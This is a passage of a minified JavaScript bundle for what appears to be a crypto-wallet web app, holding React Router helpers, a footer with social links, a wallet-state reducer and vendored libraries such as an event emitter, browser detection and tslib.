0})});PT.displayName="Form";function TT(t){return`${t} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function nS(t){let e=ue.useContext(Va);return vt(e,TT(t)),e}function AT(t,{target:e,replace:n,state:r,preventScrollReset:i,relative:o,viewTransition:l}={}){let c=MP(),u=uo(),f=Dc(t,{relative:o});return ue.useCallback(d=>{if(aT(d,e)){d.preventDefault();let y=n!==void 0?n:mc(u)===mc(f);c(t,{replace:y,state:r,preventScrollReset:i,relative:o,viewTransition:l})}},[u,c,f,n,r,e,t,i,o,l])}var CT=0,RT=()=>`__${String(++CT)}__`;function DT(){let{router:t}=nS("useSubmit"),{basename:e}=ue.useContext(ni),n=ZP();return ue.useCallback(async(r,i={})=>{let{action:o,method:l,encType:c,formData:u,body:f}=uT(r,e);if(i.navigate===!1){let d=i.fetcherKey||RT();await t.fetch(d,n,i.action||o,{preventScrollReset:i.preventScrollReset,formData:u,body:f,formMethod:i.method||l,formEncType:i.encType||c,flushSync:i.flushSync})}else await t.navigate(i.action||o,{preventScrollReset:i.preventScrollReset,formData:u,body:f,formMethod:i.method||l,formEncType:i.encType||c,replace:i.replace,state:i.state,fromRouteId:n,flushSync:i.flushSync,viewTransition:i.viewTransition})},[t,e,n])}function NT(t,{relative:e}={}){let{basename:n}=ue.useContext(ni),r=ue.useContext(Bi);vt(r,"useFormAction must be used inside a RouteContext");let[i]=r.matches.slice(-1),o={...Dc(t||".",{relative:e})},l=uo();if(t==null){o.search=l.search;let c=new URLSearchParams(o.search),u=c.getAll("index");if(u.some(d=>d==="")){c.delete("index"),u.filter(y=>y).forEach(y=>c.append("index",y));let d=c.toString();o.search=d?`?${d}`:""}}return(!t||t===".")&&i.route.index&&(o.search=o.search?o.search.replace(/^\?/,"?index&"):"?index"),n!=="/"&&(o.pathname=o.pathname==="/"?n:Ti([n,o.pathname])),mc(o)}function kT(t,e={}){let n=ue.useContext(Kx);vt(n!=null,"`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");let{basename:r}=nS("useViewTransitionState"),i=Dc(t,{relative:e.relative});if(!n.isTransitioning)return!1;let o=Ni(n.currentLocation.pathname,r)||n.currentLocation.pathname,l=Ni(n.nextLocation.pathname,r)||n.nextLocation.pathname;return Zh(i.pathname,l)!=null||Zh(i.pathname,o)!=null}[...wT];const BT=()=>H.jsx(H.Fragment,{children:H.jsxs("footer",{className:"text-center",children:[H.jsx("h2",{className:"py-5 underline",children:"Links"}),H.jsxs("span",{className:"icons",children:[H.jsx("a",{href:"https://telegram.com/pumpfun_tokensupply_bot",children:H.jsx("i",{className:"fa-brands fa-telegram"})}),"   ",H.jsx("a",{href:"https://x.com/mo64090more?s=21",children:H.jsx("i",{className:"fa-solid fa-x"})})]}),H.jsxs("div",{className:"mb-5",children:[H.jsx("i",{className:"fa fa-copyright","aria-hidden":"true"})," All rights reserved 2025 | Trade better | Protect wallet!"]})]})}),rS={address:null,chain:"ethereum",error:null,dropdownVisible:!1},LT=(t,e)=>{switch(e.type){case"SET_ADDRESS":return{...t,address:e.payload,error:null};case"SET_CHAIN":return{...t,chain:e.payload};case"TOGGLE_DROPDOWN":return{...t,dropdownVisible:!t.dropdownVisible};case"DISCONNECT":return{...rS};case"SET_ERROR":return{...t,error:e.payload};default:return t}},iS=ue.createContext(),jT=({children:t})=>{const[e,n]=ue.useReducer(LT,rS);return H.jsx(iS.Provider,{value:{state:e,dispatch:n},children:t})},sS=()=>ue.useContext(iS),UT="modulepreload",MT=function(t){return"/"+t},O1={},xa=function(e,n,r){let i=Promise.resolve();if(n&&n.length>0){let l=function(f){return Promise.all(f.map(d=>Promise.resolve(d).then(y=>({status:"fulfilled",value:y}),y=>({status:"rejected",reason:y}))))};document.getElementsByTagName("link");const c=document.querySelector("meta[property=csp-nonce]"),u=(c==null?void 0:c.nonce)||(c==null?void 0:c.getAttribute("nonce"));i=l(n.map(f=>{if(f=MT(f),f in O1)return;O1[f]=!0;const d=f.endsWith(".css"),y=d?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${f}"]${y}`))return;const g=document.createElement("link");if(g.rel=d?"stylesheet":UT,d||(g.as="script"),g.crossOrigin="",g.href=f,u&&g.setAttribute("nonce",u),document.head.appendChild(g),d)return new Promise((E,w)=>{g.addEventListener("load",E),g.addEventListener("error",()=>w(new Error(`Unable to preload CSS for ${f}`)))})}))}function o(l){const c=new Event("vite:preloadError",{cancelable:!0});if(c.payload=l,window.dispatchEvent(c),!c.defaultPrevented)throw l}return i.then(l=>{for(const c of l||[])c.status==="rejected"&&o(c.reason);return e().catch(o)})};var dh={exports:{}},$1;function FT(){if($1)return dh.exports;$1=1;var t=typeof Reflect=="object"?Reflect:null,e=t&&typeof t.apply=="function"?t.apply:function(R,T,D){return Function.prototype.apply.call(R,T,D)},n;t&&typeof t.ownKeys=="function"?n=t.ownKeys:Object.getOwnPropertySymbols?n=function(R){return Object.getOwnPropertyNames(R).concat(Object.getOwnPropertySymbols(R))}:n=function(R){return Object.getOwnPropertyNames(R)};function r($){console&&console.warn&&console.warn($)}var i=Number.isNaN||function(R){return R!==R};function o(){o.init.call(this)}dh.exports=o,dh.exports.once=x,o.EventEmitter=o,o.prototype._events=void 0,o.prototype._eventsCount=0,o.prototype._maxListeners=void 0;var l=10;function c($){if(typeof $!="function")throw new TypeError('The "listener" argument must be of type Function. Received type '+typeof $)}Object.defineProperty(o,"defaultMaxListeners",{enumerable:!0,get:function(){return l},set:function($){if(typeof $!="number"||$<0||i($))throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received '+$+".");l=$}}),o.init=function(){(this._events===void 0||this._events===Object.getPrototypeOf(this)._events)&&(this._events=Object.create(null),this._eventsCount=0),this._maxListeners=this._maxListeners||void 0},o.prototype.setMaxListeners=function(R){if(typeof R!="number"||R<0||i(R))throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received '+R+".");return this._maxListeners=R,this};function u($){return $._maxListeners===void 0?o.defaultMaxListeners:$._maxListeners}o.prototype.getMaxListeners=function(){return u(this)},o.prototype.emit=function(R){for(var T=[],D=1;D<arguments.length;D++)T.push(arguments[D]);var B=R==="error",k=this._events;if(k!==void 0)B=B&&k.error===void 0;else if(!B)return!1;if(B){var G;if(T.length>0&&(G=T[0]),G instanceof Error)throw G;var W=new Error("Unhandled error."+(G?" ("+G.message+")":""));throw W.context=G,W}var J=k[R];if(J===void 0)return!1;if(typeof J=="function")e(J,this,T);else for(var ne=J.length,j=w(J,ne),D=0;D<ne;++D)e(j[D],this,T);return!0};function f($,R,T,D){var B,k,G;if(c(T),k=$._events,k===void 0?(k=$._events=Object.create(null),$._eventsCount=0):(k.newListener!==void 0&&($.emit("newListener",R,T.listener?T.listener:T),k=$._events),G=k[R]),G===void 0)G=k[R]=T,++$._eventsCount;else if(typeof G=="function"?G=k[R]=D?[T,G]:[G,T]:D?G.unshift(T):G.push(T),B=u($),B>0&&G.length>B&&!G.warned){G.warned=!0;var W=new Error("Possible EventEmitter memory leak detected. "+G.length+" "+String(R)+" listeners added. Use emitter.setMaxListeners() to increase limit");W.name="MaxListenersExceededWarning",W.emitter=$,W.type=R,W.count=G.length,r(W)}return $}o.prototype.addListener=function(R,T){return f(this,R,T,!1)},o.prototype.on=o.prototype.addListener,o.prototype.prependListener=function(R,T){return f(this,R,T,!0)};function d(){if(!this.fired)return this.target.removeListener(this.type,this.wrapFn),this.fired=!0,arguments.length===0?this.listener.call(this.target):this.listener.apply(this.target,arguments)}function y($,R,T){var D={fired:!1,wrapFn:void 0,target:$,type:R,listener:T},B=d.bind(D);return B.listener=T,D.wrapFn=B,B}o.prototype.once=function(R,T){return c(T),this.on(R,y(this,R,T)),this},o.prototype.prependOnceListener=function(R,T){return c(T),this.prependListener(R,y(this,R,T)),this},o.prototype.removeListener=function(R,T){var D,B,k,G,W;if(c(T),B=this._events,B===void 0)return this;if(D=B[R],D===void 0)return this;if(D===T||D.listener===T)--this._eventsCount===0?this._events=Object.create(null):(delete B[R],B.removeListener&&this.emit("removeListener",R,D.listener||T));else if(typeof D!="function"){for(k=-1,G=D.length-1;G>=0;G--)if(D[G]===T||D[G].listener===T){W=D[G].listener,k=G;break}if(k<0)return this;k===0?D.shift():b(D,k),D.length===1&&(B[R]=D[0]),B.removeListener!==void 0&&this.emit("removeListener",R,W||T)}return this},o.prototype.off=o.prototype.removeListener,o.prototype.removeAllListeners=function(R){var T,D,B;if(D=this._events,D===void 0)return this;if(D.removeListener===void 0)return arguments.length===0?(this._events=Object.create(null),this._eventsCount=0):D[R]!==void 0&&(--this._eventsCount===0?this._events=Object.create(null):delete D[R]),this;if(arguments.length===0){var k=Object.keys(D),G;for(B=0;B<k.length;++B)G=k[B],G!=="removeListener"&&this.removeAllListeners(G);return this.removeAllListeners("removeListener"),this._events=Object.create(null),this._eventsCount=0,this}if(T=D[R],typeof T=="function")this.removeListener(R,T);else if(T!==void 0)for(B=T.length-1;B>=0;B--)this.removeListener(R,T[B]);return this};function g($,R,T){var D=$._events;if(D===void 0)return[];var B=D[R];return B===void 0?[]:typeof B=="function"?T?[B.listener||B]:[B]:T?m(B):w(B,B.length)}o.prototype.listeners=function(R){return g(this,R,!0)},o.prototype.rawListeners=function(R){return g(this,R,!1)},o.listenerCount=function($,R){return typeof $.listenerCount=="function"?$.listenerCount(R):E.call($,R)},o.prototype.listenerCount=E;function E($){var R=this._events;if(R!==void 0){var T=R[$];if(typeof T=="function")return 1;if(T!==void 0)return T.length}return 0}o.prototype.eventNames=function(){return this._eventsCount>0?n(this._events):[]};function w($,R){for(var T=new Array(R),D=0;D<R;++D)T[D]=$[D];return T}function b($,R){for(;R+1<$.length;R++)$[R]=$[R+1];$.pop()}function m($){for(var R=new Array($.length),T=0;T<R.length;++T)R[T]=$[T].listener||$[T];return R}function x($,R){return new Promise(function(T,D){function B(G){$.removeListener(R,k),D(G)}function k(){typeof $.removeListener=="function"&&$.removeListener("error",B),T([].slice.call(arguments))}O($,R,k,{once:!0}),R!=="error"&&S($,B,{once:!0})})}function S($,R,T){typeof $.on=="function"&&O($,"error",R,T)}function O($,R,T,D){if(typeof $.on=="function")D.once?$.once(R,T):$.on(R,T);else if(typeof $.addEventListener=="function")$.addEventListener(R,function B(k){D.once&&$.removeEventListener(R,B),T(k)});else throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type '+typeof $)}return dh.exports}var rr=FT();const Mm=yf(rr);var P1=function(t,e,n){if(n||arguments.length===2)for(var r=0,i=e.length,o;r<i;r++)(o||!(r in e))&&(o||(o=Array.prototype.slice.call(e,0,r)),o[r]=e[r]);return t.concat(o||Array.prototype.slice.call(e))},zT=function(){function t(e,n,r){this.name=e,this.version=n,this.os=r,this.type="browser"}return t}(),qT=function(){function t(e){this.version=e,this.type="node",this.name="node",this.os=process.platform}return t}(),HT=function(){function t(e,n,r,i){this.name=e,this.version=n,this.os=r,this.bot=i,this.type="bot-device"}return t}(),VT=function(){function t(){this.type="bot",this.bot=!0,this.name="bot",this.version=null,this.os=null}return t}(),WT=function(){function t(){this.type="react-native",this.name="react-native",this.version=null,this.os=null}return t}(),KT=/alexa|bot|crawl(er|ing)|facebookexternalhit|feedburner|google web preview|nagios|postrank|pingdom|slurp|spider|yahoo!|yandex/,GT=/(nuhk|curl|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask\ Jeeves\/Teoma|ia_archiver)/,T1=3,YT=[["aol",/AOLShield\/([0-9\._]+)/],["edge",/Edge\/([0-9\._]+)/],["edge-ios",/EdgiOS\/([0-9\._]+)/],["yandexbrowser",/YaBrowser\/([0-9\._]+)/],["kakaotalk",/KAKAOTALK\s([0-9\.]+)/],["samsung",/SamsungBrowser\/([0-9\.]+)/],["silk",/\bSilk\/([0-9._-]+)\b/],["miui",/MiuiBrowser\/([0-9\.]+)$/],["beaker",/BeakerBrowser\/([0-9\.]+)/],["edge-chromium",/EdgA?\/([0-9\.]+)/],["chromium-webview",/(?!Chrom.*OPR)wv\).*Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["chrome",/(?!Chrom.*OPR)Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["phantomjs",/PhantomJS\/([0-9\.]+)(:?\s|$)/],["crios",/CriOS\/([0-9\.]+)(:?\s|$)/],["firefox",/Firefox\/([0-9\.]+)(?:\s|$)/],["fxios",/FxiOS\/([0-9\.]+)/],["opera-mini",/Opera Mini.*Version\/([0-9\.]+)/],["opera",/Opera\/([0-9\.]+)(?:\s|$)/],["opera",/OPR\/([0-9\.]+)(:?\s|$)/],["pie",/^Microsoft Pocket Internet Explorer\/(\d+\.\d+)$/],["pie",/^Mozilla\/\d\.\d+\s\(compatible;\s(?:MSP?IE|MSInternet Explorer) (\d+\.\d+);.*Windows CE.*\)$/],["netfront",/^Mozilla\/\d\.\d+.*NetFront\/(\d.\d)/],["ie",/Trident\/7\.0.*rv\:([0-9\.]+).*\).*Gecko$/],["ie",/MSIE\s([0-9\.]+);.*Trident\/[4-7].0/],["ie",/MSIE\s(7\.0)/],["bb10",/BB10;\sTouch.*Version\/([0-9\.]+)/],["android",/Android\s([0-9\.]+)/],["ios",/Version\/([0-9\._]+).*Mobile.*Safari.*/],["safari",/Version\/([0-9\._]+).*Safari/],["facebook",/FB[AS]V\/([0-9\.]+)/],["instagram",/Instagram\s([0-9\.]+)/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Mobile/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Gecko\)$/],["curl",/^curl\/([0-9\.]+)$/],["searchbot",KT]],A1=[["iOS",/iP(hone|od|ad)/],["Android OS",/Android/],["BlackBerry OS",/BlackBerry|BB10/],["Windows Mobile",/IEMobile/],["Amazon OS",/Kindle/],["Windows 3.11",/Win16/],["Windows 95",/(Windows 95)|(Win95)|(Windows_95)/],["Windows 98",/(Windows 98)|(Win98)/],["Windows 2000",/(Windows NT 5.0)|(Windows 2000)/],["Windows XP",/(Windows NT 5.1)|(Windows XP)/],["Windows Server 2003",/(Windows NT 5.2)/],["Windows Vista",/(Windows NT 6.0)/],["Windows 7",/(Windows NT 6.1)/],["Windows 8",/(Windows NT 6.2)/],["Windows 8.1",/(Windows NT 6.3)/],["Windows 10",/(Windows NT 10.0)/],["Windows ME",/Windows ME/],["Windows CE",/Windows CE|WinCE|Microsoft Pocket Internet Explorer/],["Open BSD",/OpenBSD/],["Sun OS",/SunOS/],["Chrome OS",/CrOS/],["Linux",/(Linux)|(X11)/],["Mac OS",/(Mac_PowerPC)|(Macintosh)/],["QNX",/QNX/],["BeOS",/BeOS/],["OS/2",/OS\/2/]];function JT(t){return typeof document>"u"&&typeof navigator<"u"&&navigator.product==="ReactNative"?new WT:typeof navigator<"u"?QT(navigator.userAgent):eA()}function ZT(t){return t!==""&&YT.reduce(function(e,n){var r=n[0],i=n[1];if(e)return e;var o=i.exec(t);return!!o&&[r,o]},!1)}function QT(t){var e=ZT(t);if(!e)return null;var n=e[0],r=e[1];if(n==="searchbot")return new VT;var i=r[1]&&r[1].split(".").join("_").split("_").slice(0,3);i?i.length<T1&&(i=P1(P1([],i,!0),tA(T1-i.length),!0)):i=[];var o=i.join("."),l=XT(t),c=GT.exec(t);return c&&c[1]?new HT(n,o,l,c[1]):new zT(n,o,l)}function XT(t){for(var e=0,n=A1.length;e<n;e++){var r=A1[e],i=r[0],o=r[1],l=o.exec(t);if(l)return i}return null}function eA(){var t=typeof process<"u"&&process.version;return t?new qT(process.version.slice(1)):null}function tA(t){for(var e=[],n=0;n<t;n++)e.push("0");return e}var Xp={};/*! *****************************************************************************
Copyright (c) Microsoft Corporation.

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
PERFORMANCE OF THIS SOFTWARE.
***************************************************************************** */var gy=function(t,e){return gy=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(n,r){n.__proto__=r}||function(n,r){for(var i in r)r.hasOwnProperty(i)&&(n[i]=r[i])},gy(t,e)};function nA(t,e){gy(t,e);function n(){this.constructor=t}t.prototype=e===null?Object.create(e):(n.prototype=e.prototype,new n)}var yy=function(){return yy=Object.assign||function(e){for(var n,r=1,i=arguments.length;r<i;r++){n=arguments[r];for(var o in n)Object.prototype.hasOwnProperty.call(n,o)&&(e[o]=n[o])}return e},yy.apply(this,arguments)};function rA(t,e){var n={};for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&e.indexOf(r)<0&&(n[r]=t[r]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,r=Object.getOwnPropertySymbols(t);i<r.length;i++)e.indexOf(r[i])<0&&Object.prototype.propertyIsEnumerable.call(t,r[i])&&(n[r[i]]=t[r[i]]);return n}function iA(t,e,n,r){var i=arguments.length,o=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,l;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")o=Reflect.decorate(t,e,n,r);else for(var c=t.length-1;c>=0;c--)(l=t[c])&&(o=(i<3?l(o):i>3?l(e,n,o):l(e,n))||o);return i>3&&o&&Object.defineProperty(e,n,o),o}function sA(t,e){return function(n,r){e(n,r,t)}}function oA(t,e){if(typeof Reflect=="object"&&typeof Reflect.metadata=="function")return Reflect.metadata(t,e)}function aA(t,e,n,r){function i(o){return o instanceof n?o:new n(function(l){l(o)})}return new(n||(n=Promise))(function(o,l){function c(d){try{f(r.next(d))}catch(y){l(y)}}function u(d){try{f(r.throw(d))}catch(y){l(y)}}function f(d){d.done?o(d.value):i(d.value).then(c,u)}f((r=r.apply(t,e||[])).next())})}function lA(t,e){var n={label:0,sent:function(){if(o[0]&1)throw o[1];return o[1]},trys:[],ops:[]},r,i,o,l;return l={next:c(0),throw:c(1),return:c(2)},typeof Symbol=="function"&&(l[Symbol.iterator]=function(){return this}),l;function c(f){return function(d){return u([f,d])}}function u(f){if(r)throw new TypeError("Generator is already executing.");for(;n;)try{if(r=1,i&&(o=f[0]&2?i.return:f[0]?i.throw||((o=i.return)&&o.call(i),0):i.next)&&!(o=o.call(i,f[1])).done)return o;switch(i=0,o&&(f=[f[0]&2,o.value]),f[0]){case 0:case 1:o=f;break;case 4:return n.label++,{value:f[1],done:!1};case 5:n.label++,i=f[1],f=[0];continue;case 7:f=n.ops.pop(),n.trys.pop();continue;default:if(o=n.trys,!(o=o.length>0&&o[o.length-1])&&(f[0]===6||f[0]===2)){n=0;continue}if(f[0]===3&&(!o||f[1]>o[0]&&f[1]<o[3])){n.label=f[1];break}if(f[0]===6&&n.label<o[1]){n.label=o[1],o=f;break}if(o&&n.label<o[2]){n.label=o[2],n.ops.push(f);break}o[2]&&n.ops.pop(),n.trys.pop();continue}f=e.call(t,n)}catch(d){f=[6,d],i=0}finally{r=o=0}if(f[0]&5)throw f[1];return{value:f[0]?f[1]:void 0,done:!0}}}function cA(t,e,n,r){r===void 0&&(r=n),t[r]=e[n]}function uA(t,e){for(var n in t)n!=="default"&&!e.hasOwnProperty(n)&&(e[n]=t[n])}function my(t){var e=typeof Symbol=="function"&&Symbol.iterator,n=e&&t[e],r=0;if(n)return n.call(t);if(t&&typeof t.length=="number")return{next:function(){return t&&r>=t.length&&(t=void 0),{value:t&&t[r++],done:!t}}};throw new TypeError(e?"Object is not iterable.":"Symbol.iterator is not defined.")}function oS(t,e){var n=typeof Symbol=="function"&&t[Symbol.iterator];if(!n)return t;var r=n.call(t),i,o=[],l;try{for(;(e===void 0||e-- >0)&&!(i=r.next()).done;)o.push(i.value)}catch(c){l={error:c}}finally{try{i&&!i.done&&(n=r.return)&&n.call(r)}finally{if(l)throw l.error}}return o}function hA(){for(var t=[],e=0;e<arguments.length;e++)t=t.concat(oS(arguments[e]));return t}function fA(){for(var t=0,e=0,n=arguments.length;e<n;e++)t+=arguments[e].length;for(var r=Array(t),i=0,e=0;e<n;e++)for(var o=arguments[e],l=0,c=o.length;l<c;l++,i++)r[i]=o[l];return r}function wc(t){return this instanceof wc?(this.v=t,this):new wc(t)}function dA(t,e,n){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var r=n.apply(t,e||[]),i,o=[];return i={},l("next"),l("throw"),l("return"),i[Symbol.asyncIterator]=function(){return this},i;function l(g){r[g]&&(i[g]=function(E){return new Promise(function(w,b){o.push([g,E,w,b])>1||c(g,E)})})}function c(g,E){try{u(r[g](E))}catch(w){y(o[0][3],w)}}function u(g){g.value instanceof wc?Promise.resolve(g.value.v).then(f,d):y(o[0][2],g)}function f(g){c("next",g)}function d(g){c("throw",g)}function y(g,E){g(E),o.shift(),o.length&&c(o[0][0],o[0][1])}}function pA(t){var e,n;return e={},r("next"),r("throw",function(i){throw i}),r("return"),e[Symbol.iterator]=function(){return this},e;function r(i,o){e[i]=t[i]?function(l){return(n=!n)?{value:wc(t[i](l)),done:i==="return"}:o?o(l):l}:o}}function gA(t){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var e=t[Symbol.asyncIterator],n;return e?e.call(t):(t=typeof my=="function"?my(t):t[Symbol.iterator](),n={},r("next"),r("throw"),r("return"),n[Symbol.asyncIterator]=function(){return this},n);function r(o){n[o]=t[o]&&function(l){return new Promise(function(c,u){l=t[o](l),i(c,u,l.done,l.value)})}}function i(o,l,c,u){Promise.resolve(u).then(function(f){o({value:f,done:c})},l)}}function yA(t,e){return Object.defineProperty?Object.defineProperty(t,"raw",{value:e}):t.raw=e,t}function mA(t){if(t&&t.__esModule)return t;var e={};if(t!=null)for(var n in t)Object.hasOwnProperty.call(t,n)&&(e[n]=t[n]);return e.default=t,e}function wA(t){return t&&t.__esModule?t:{default:t}}function vA(t,e){if(!e.has(t))throw new TypeError("attempted to get private field on non-instance");return e.get(t)}function bA(t,e,n){if(!e.has(t))throw new TypeError("attempted to set private field on non-instance");return e.set(t,n),n}const EA=Object.freeze(Object.defineProperty({__proto__:null,get __assign(){return yy},__asyncDelegator:pA,__asyncGenerator:dA,__asyncValues:gA,__await:wc,__awaiter:aA,__classPrivateFieldGet:vA,__classPrivateFieldSet:bA,__createBinding:cA,__decorate:iA,__exportStar:uA,__extends:nA,__generator:lA,__importDefault:wA,__importStar:mA,__makeTemplateObject:yA,__metadata:oA,__param:sA,__read:oS,__rest:rA,__spread:hA,__spreadArrays:fA,__values:my},Symbol.toStringTag,{value:"Module"})),bf=Mx(EA);var eg={},Hl={},C1;function xA(){if(C1)return Hl;C1=1,Object.defineProperty(Hl,"__esModule",{value:!0}),Hl.delay=void 0;function t(e){return new Promise(n=>{setTimeout(()=>{n(!0)},e)})}return Hl.delay=t,Hl}var Bs={},tg={},Ls={},R1;function SA(){return R1||(R1=1,Object.defineProperty(Ls,"__esModule",{value:!0}),Ls.ONE_THOUSAND=Ls.ONE_HUNDRED=void 0,Ls.ONE_HUNDRED=100,Ls.ONE_THOUSAND=1e3),Ls}var ng={},D1;function _A(){return D1||(D1=1,function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.ONE_YEAR=t.FOUR_WEEKS=t.THREE_WEEKS=t.TWO_WEEKS=t.ONE_WEEK=t.THIRTY_DAYS=t.SEVEN_DAYS=t.FIVE_DAYS=t.THREE_DAYS=t.ONE_DAY=t.TWENTY_FOUR_HOURS=t.TWELVE_HOURS=t.SIX_HOURS=t.THREE_HOURS=t.ONE_HOUR=t.SIXTY_MINUTES=t.THIRTY_MINUTES=t.TEN_MINUTES=t.FIVE_MINUTES=t.ONE_MINUTE=t.SIXTY_SECONDS=t.THIRTY_SECONDS=t.TEN_SECONDS=t.FIVE_SECONDS=t.ONE_SECOND=void 0,t.ONE_SECOND=1,t.FIVE_SECONDS=5,t.TEN_SECONDS=10,t.THIRTY_SECONDS=30,t.SIXTY_SECONDS=60,t.ONE_MINUTE=t.SIXTY_SECONDS,t.FIVE_MINUTES=t.ONE_MINUTE*5,t.TEN_MINUTES=t.ONE_MINUTE*10,t.THIRTY_MINUTES=t.ONE_MINUTE*30,t.SIXTY_MINUTES=t.ONE_MINUTE*60,t.ONE_HOUR=t.SIXTY_MINUTES,t.THREE_HOURS=t.ONE_HOUR*3,t.SIX_HOURS=t.ONE_HOUR*6,t.TWELVE_HOURS=t.ONE_HOUR*12,t.TWENTY_FOUR_HOURS=t.ONE_HOUR*24,t.ONE_DAY=t.TWENTY_FOUR_HOURS,t.THREE_DAYS=t.ONE_DAY*3,t.FIVE_DAYS=t.ONE_DAY*5,t.SEVEN_DAYS=t.ONE_DAY*7,t.THIRTY_DAYS=t.ONE_DAY*30,t.ONE_WEEK=t.SEVEN_DAYS,t.TWO_WEEKS=t.ONE_WEEK*2,t.THREE_WEEKS=t.ONE_WEEK*3,t.FOUR_WEEKS=t.ONE_WEEK*4,t.ONE_YEAR=t.ONE_DAY*365}(ng)),ng}var N1;function aS(){return N1||(N1=1,function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=bf;e.__exportStar(SA(),t),e.__exportStar(_A(),t)}(tg)),tg}var k1;function IA(){if(k1)return Bs;k1=1,Object.defineProperty(Bs,"__esModule",{value:!0}),Bs.fromMiliseconds=Bs.toMiliseconds=void 0;const t=aS();function e(r){return r*t.ONE_THOUSAND}Bs.toMiliseconds=e;function n(r){return Math.floor(r/t.ONE_THOUSAND)}return Bs.fromMiliseconds=n,Bs}var B1;function OA(){return B1||(B1=1,function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=bf;e.__exportStar(xA(),t),e.__exportStar(IA(),t)}(eg)),eg}var qo={},L1;function $A(){if(L1)return qo;L1=1,Object.defineProperty(qo,"__esModule",{value:!0}),qo.Watch=void 0;class t{constructor(){this.timestamps=new Map}start(n){if(this.timestamps.has(n))throw new Error(`Watch already started for label: ${n}`);this.timestamps.set(n,{started:Date.now()})}stop(n){const r=this.get(n);if(typeof r.elapsed<"u")throw new Error(`Watch already stopped for label: ${n}`);const i=Date.now()-r.started;this.timestamps.set(n,{started:r.started,elapsed:i})}get(n){const r=this.timestamps.get(n);if(typeof r>"u")throw new Error(`No timestamp found for label: ${n}`);return r}elapsed(n){const r=this.get(n);return r.elapsed||Date.now()-r.started}}return qo.Watch=t,qo.default=t,qo}var rg={},Vl={},j1;function PA(){if(j1)return Vl;j1=1,Object.defineProperty(Vl,"__esModule",{value:!0}),Vl.IWatch=void 0;class t{}return Vl.IWatch=t,Vl}var U1;function TA(){return U1||(U1=1,function(t){Object.defineProperty(t,"__esModule",{value:!0}),bf.__exportStar(PA(),t)}(rg)),rg}var M1;function AA(){return M1||(M1=1,function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=bf;e.__exportStar(OA(),t),e.__exportStar($A(),t),e.__exportStar(TA(),t),e.__exportStar(aS(),t)}(Xp)),Xp}var be=AA(),tt={},F1;function lS(){if(F1)return tt;F1=1,Object.defineProperty(tt,"__esModule",{value:!0}),tt.getLocalStorage=tt.getLocalStorageOrThrow=tt.getCrypto=tt.getCryptoOrThrow=tt.getLocation=tt.getLocationOrThrow=tt.getNavigator=tt.getNavigatorOrThrow=tt.getDocument=tt.getDocumentOrThrow=tt.getFromWindowOrThrow=tt.getFromWindow=void 0;function t(g){let E;return typeof window<"u"&&typeof window[g]<"u"&&(E=window[g]),E}tt.getFromWindow=t;function e(g){const E=t(g);if(!E)throw new Error(`${g} is not defined in Window`);return E}tt.getFromWindowOrThrow=e;function n(){return e("document")}tt.getDocumentOrThrow=n;function r(){return t("document")}tt.getDocument=r;function i(){return e("navigator")}tt.getNavigatorOrThrow=i;function o(){return t("navigator")}tt.getNavigator=o;function l(){return e("location")}tt.getLocationOrThrow=l;function c(){return t("location")}tt.getLocation=c;function u(){return e("crypto")}tt.getCryptoOrThrow=u;function f(){return t("crypto")}tt.getCrypto=f;function d(){return e("localStorage")}tt.getLocalStorageOrThrow=d;function y(){return t("localStorage")}return tt.getLocalStorage=y,tt}lS();var Wl={},z1;function CA(){if(z1)return Wl;z1=1,Object.defineProperty(Wl,"__esModule",{value:!0}),Wl.getWindowMetadata=void 0;const t=lS();function e(){let n,r;try{n=t.getDocumentOrThrow(),r=t.getLocationOrThrow()}catch{return null}function i(){const E=n.getElementsByTagName("link"),w=[];for(let b=0;b<E.length;b++){const m=E[b],x=m.getAttribute("rel");if(x&&x.toLowerCase().indexOf("icon")>-1){const S=m.getAttribute("href");if(S)if(S.toLowerCase().indexOf("https:")===-1&&S.toLowerCase().indexOf("http:")===-1&&S.indexOf("//")!==0){let O=r.protocol+"//"+r.host;if(S.indexOf("/")===0)O+=S;else{const $=r.pathname.split("/");$.pop();const R=$.join("/");O+=R+"/"+S}w.push(O)}else if(S.indexOf("//")===0){const O=r.protocol+S;w.push(O)}else w.push(S)}}return w}function o(...E){const w=n.getElementsByTagName("meta");for(let b=0;b<w.length;b++){const m=w[b],x=["itemprop","property","name"].map(S=>m.getAttribute(S)).filter(S=>S?E.includes(S):!1);if(x.length&&x){const S=m.getAttribute("content");if(S)return S}}return""}function l(){let E=o("name","og:site_name","og:title","twitter:title");return E||(E=n.title),E}function c(){return o("description","og:description","twitter:description","keywords")}const 